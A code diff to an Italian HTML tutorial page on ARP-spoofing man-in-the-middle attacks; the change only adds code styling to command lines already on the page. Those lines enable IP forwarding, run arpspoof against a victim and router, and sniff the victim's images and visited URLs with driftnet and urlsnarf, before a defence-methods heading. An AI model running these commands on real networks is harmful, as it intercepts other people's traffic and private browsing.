@@ -46,6 +46,17 @@
                             height: 300px;
                         }
                     </style>
+                    <style>
+                    .http-code {
+                        background-color: #f7f7f7;
+                        padding: 10px;
+                        border: 1px solid #ddd;
+                        font-family: Consolas, Monaco, monospace;
+                        font-size: 14px;
+                        line-height: 1.4;
+                        white-space: pre-wrap;
+                      }
+                      </style>
                     <img src="assets/img/mitm.png" alt=""class="immagine-ridimensionata">
                     <div class="subheading mb-5">
                     </div>
@@ -61,16 +72,16 @@
                     <H3>cosa si è fatto</H3>
                    <hr>
                     <p class="lead mb-5"> si sono utilizzati diversi comandi da terminale :</p>
-                    <p>$ sysctl -w net.ipv4.ip_forward=1</p>
+                    <p class="http-code">$ sysctl -w net.ipv4.ip_forward=1</p>
                     <p>che serve per serve per inoltrare tutti i pacchetti di rete IPv4, in questo modo il pc fungerà da Router</p>
-                    <p>$ arpspoof -i [Network Interface Name] -t [Victim IP] [Router IP]</p>
+                    <p class="http-code">$ arpspoof -i [Network Interface Name] -t [Victim IP] [Router IP]</p>
                     <p> questo serve a indicare alla macchina vitima che noi siamo il router ossia il default gateway</p>
-                    <p> $ arpspoof -i [Network Interface Name] -t [Router IP] [Victim IP]</p>
+                    <p class="http-code"> $ arpspoof -i [Network Interface Name] -t [Router IP] [Victim IP]</p>
                     <p> con questo comando serve a dire al router che noi siamo la macchina vittima </p>
                     <p> per sniffare le immagini della macchina vittima si procede con l'utilzare ils eguente comando</p>
-                    <p>$ driftnet -i [Network Interface Name]</p>
+                    <p class="http-code">$ driftnet -i [Network Interface Name]</p>
                     <p> per sniffare sugli URL di navigazione della macchina vittima si utilizza il seguente comando</p>
-                    <p>$ urlsnarf -i [Network Interface Name]</p>
+                    <p class="http-code">$ urlsnarf -i [Network Interface Name]</p>
                    <hr>
                     <H3>metodi di difesa</H3>
                     <hr>
